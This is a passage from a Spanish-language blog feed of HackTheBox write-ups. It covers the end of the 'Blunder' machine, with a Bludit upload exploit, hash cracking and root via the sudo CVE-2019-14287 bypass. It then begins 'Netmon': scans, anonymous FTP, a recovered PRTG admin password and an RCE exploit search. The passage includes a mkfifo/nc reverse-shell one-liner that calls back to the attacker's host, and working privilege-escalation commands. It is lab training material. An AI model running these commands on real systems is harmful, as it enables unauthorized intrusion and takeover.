[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.4 443 &amp;gt;/tmp/f
[+] Delete: .htaccess
[+] Delete: rubnxlev.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.191.
Ncat: Connection from 10.10.10.191:47166.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como de constumbre vamos a otorgarnos una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export SHELL=bash
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerando el sistema dentro en el directorio &lt;code&gt;bludit-3-10-0a&lt;/code&gt;, encontramos el archivo &lt;code&gt;users.php&lt;/code&gt; con un password en hash que podemos tratar de crackear.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
&amp;lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&amp;gt;
{
    &quot;admin&quot;: {
        &quot;nickname&quot;: &quot;Hugo&quot;,
        &quot;firstName&quot;: &quot;Hugo&quot;,
        &quot;lastName&quot;: &quot;&quot;,
        &quot;role&quot;: &quot;User&quot;,
        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
        &quot;email&quot;: &quot;&quot;,
        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
        &quot;tokenRemember&quot;: &quot;&quot;,
        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
        &quot;twitter&quot;: &quot;&quot;,
        &quot;facebook&quot;: &quot;&quot;,
        &quot;instagram&quot;: &quot;&quot;,
        &quot;codepen&quot;: &quot;&quot;,
        &quot;linkedin&quot;: &quot;&quot;,
        &quot;github&quot;: &quot;&quot;,
        &quot;gitlab&quot;: &quot;&quot;}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello usaremos nuestro web de confianza y logramos decifrar la contraseña la cual es &lt;code&gt;Password120&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Con la nueva credencial migramos exitosamente como el usuario &lt;code&gt;hugo&lt;/code&gt;, nos dirigimos a su directorio personal y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
Password: 
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
hugo
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd /home/hugo/
hugo@blunder:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
hugo@blunder:~$ cat user.txt 
0ad6d2d9c835f7f10ba8518d29dedc4b
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando los privilegios a nivel de &lt;code&gt;sudoers&lt;/code&gt;, vemos que el usario &lt;code&gt;hugo&lt;/code&gt;, puede ejecutar una bash como cualquier usuario a exepción de root. Aprovechando esto podemos migrar al usuario &lt;code&gt;shaun&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hugo@blunder:~$ sudo -u shaun bash
shaun@blunder:/home/hugo$ whoami
shaun
shaun@blunder:/home/hugo$ id
uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que el usuario &lt;code&gt;shaun&lt;/code&gt;,se encuntra en el grupo &lt;code&gt;lxd&lt;/code&gt;, asi que podriamos aprovecharnos de eso para convertirnos en &lt;code&gt;root&lt;/code&gt;, pero en esta ocasión vamos a realizarlo de otra manera ya que si vemos la version de sudo que se esta empleando corresponde a una vulnerable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;shaun@blunder:/home/hugo$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Buscando un exploit publico encontramos uno referente a &lt;code&gt;security bypass&lt;/code&gt; y para versiones menores a la 1.8.27, al ser esta una versión menor podemos usar este exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit sudo 1.8.
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 &amp;lt; 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                               | linux/local/25134.c
sudo 1.8.0 &amp;lt; 1.8.3p1 - Format String                                                                                                                 | linux/dos/18436.txt
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                     | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                     | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                          | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                    | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                                                                                        | linux/local/47502.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Revisamos el codigo del exploit y vemos que solo tenemos que ejecutar la siguiente instrucción &lt;code&gt;sudo -u#-1 /bin/bash&lt;/code&gt;, pero debemos hacerlo como el usuario &lt;code&gt;hugo&lt;/code&gt; ya que este tenia el privilegio a nivel de &lt;code&gt;sudoers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Una vez ya como el ususario &lt;code&gt;root&lt;/code&gt; nos dirigimos a su directorio personal y visualizamos la segunda flag &lt;code&gt;root.txt.&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo# cd /root
root@blunder:/root# cat root.txt 
dd6d458838b1d2c778b789eeb79ab063
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Wed, 14 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Blunder</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Blunder</guid>
        
        <category>information leaked</category>
        
        <category>Bludit CMS explotation</category>
        
        <category>bypass IP Blocking (X-Forwarded-For Header)</category>
        
        <category>Image File Upload (Playing with .htaccess)</category>
        
        <category>Abusing sudo privilege (CVE-2019-14287)</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Netmon - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Netmon&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt; dificultad facil, la cual explotaremos a partir de una enumeración por &lt;code&gt;ftp&lt;/code&gt; donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de &lt;code&gt;PRTG&lt;/code&gt; que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Netmon
❯ ls
 Netmon
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=200 ms

--- 10.10.10.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 199.775/199.775/199.775/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:18 GMT
Initiating SYN Stealth Scan at 04:18
Scanning 10.10.10.152 [65535 ports]
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49668/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Discovered open port 49666/tcp on 10.10.10.152
Discovered open port 49669/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 49665/tcp on 10.10.10.152
Completed SYN Stealth Scan at 04:18, 23.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.14s latency).
Scanned at 2023-06-14 04:18:22 GMT for 24s
Not shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
           Raw packets sent: 116389 (5.121MB) | Rcvd: 77893 (3.116MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:19 GMT
Nmap scan report for 10.10.10.152
Host is up (0.40s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
| 07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
| 02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
| 02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
| 02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
|_02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-14T04:20:28
|_  start_date: 2023-06-14T04:14:56

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP&lt;/td&gt;
      &lt;td&gt;Microsoft ftpd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Indy httpd 18.1.37.13946&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Server 2008 R2 - 2012 microsoft-ds&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;47001&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49664-49669&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos enumerando el servicio &lt;code&gt;ftp&lt;/code&gt; haciendo uno del usuario &lt;code&gt;anonymous&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:fmiracle): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
226 Transfer complete.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si nos dirigimos al directorio &lt;code&gt;Users&lt;/code&gt;, vemos que podemos obtener la primera flag &lt;code&gt;user.txt&lt;/code&gt;, pero aun no tenemos acceso al sistema.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; cd Users
250 CWD command successful.
ftp&amp;gt; dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
02-03-19  12:35AM       &amp;lt;DIR&amp;gt;          Public
226 Transfer complete.
ftp&amp;gt; cd Public
250 CWD command successful.
ftp&amp;gt; dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Downloads
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Music
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Pictures
06-14-23  12:15AM                   34 user.txt
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Videos
226 Transfer complete.
ftp&amp;gt; get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
34 bytes received in 0.20 secs (0.1620 kB/s)
ftp&amp;gt; exit
221 Goodbye.
❯ cat user.txt
❯ c07be14afc2253b24510769dcb7db65
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder enumear de una manera mas comoda los archivos mediante &lt;code&gt;ftp&lt;/code&gt;, vamos a crearnos una montura con la herramienta &lt;code&gt;curlftpfs&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curlftpfs
❯ mkdir /mnt/monturaftp
❯ curlftpfs ftp://10.10.10.152 /mnt/monturaftp
❯ ls -l /mnt/monturaftp
d--------- root root   0 B  Sun Nov 20 22:46:00 2016  $RECYCLE.BIN
d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Documents and Settings
d--------- root root   0 B  Mon Feb 25 22:15:00 2019  inetpub
d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
d--------- root root   0 B  Mon Feb 25 22:56:00 2019  Program Files
d--------- root root   0 B  Sun Feb  3 00:28:00 2019  Program Files (x86)
d--------- root root   0 B  Wed Dec 15 10:40:00 2021  ProgramData
d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Recovery
d--------- root root   0 B  Sun Feb  3 08:04:00 2019  System Volume Information
d--------- root root   0 B  Sun Feb  3 08:08:00 2019  Users
d--------- root root   0 B  Mon Feb 25 23:49:00 2019  Windows
.--------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr
.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
.--------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile.sys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Antes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el servicio corresponde a &lt;code&gt;PRTG Network Monitor&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Buscamos si hay &lt;code&gt;exploits&lt;/code&gt; asociados a este servicio y entre ellos una de ejecución remota de comandos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit PRTG
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                 | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                | windows/webapps/49156.txt
PRTG Network Monitor &amp;lt; 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                             | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                              | java/webapps/34108.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales.&lt;/p&gt;

&lt;p&gt;Encontramos archivos de configuración, y usaremos &lt;code&gt;diff&lt;/code&gt; para encontrar diferncias entre el archivo &lt;code&gt;.dat&lt;/code&gt; y el archivo &lt;code&gt;old.bak&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;diff &quot;PRTG Configuration.dat&quot; &quot;PRTG Configuration.old.bak&quot; | less
&amp;lt;               &amp;lt;flags&amp;gt;
&amp;lt;                 &amp;lt;encrypted/&amp;gt;
&amp;lt;               &amp;lt;/flags&amp;gt;
---
&amp;gt;             &amp;lt;!-- User: prtgadmin --&amp;gt;
&amp;gt;             PrTg@dmin2018
317c313
&amp;lt;                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
---
&amp;gt;                 6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====
325c321
&amp;lt;                 IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====
---
&amp;gt;                 ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos las credenciales &lt;code&gt;prtgadmin:PrTg@dmin2018&lt;/code&gt; con las cuales podamos logearnos en el servicio &lt;code&gt;PRTG&lt;/code&gt;, pero al intentar logearnos nos dicen que las credenciales son invalidas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Logramos conectarnos al panel como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta &lt;code&gt;myaccount.htm?tabid=2&lt;/code&gt; y envia una data que se encuentra &lt;code&gt;urlencodeada&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usaremos una sesión interactiva de &lt;code&gt;php&lt;/code&gt; para urldecodear la data y ver mejor que es lo que envia.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ php --interactive
Interactive mode enabled
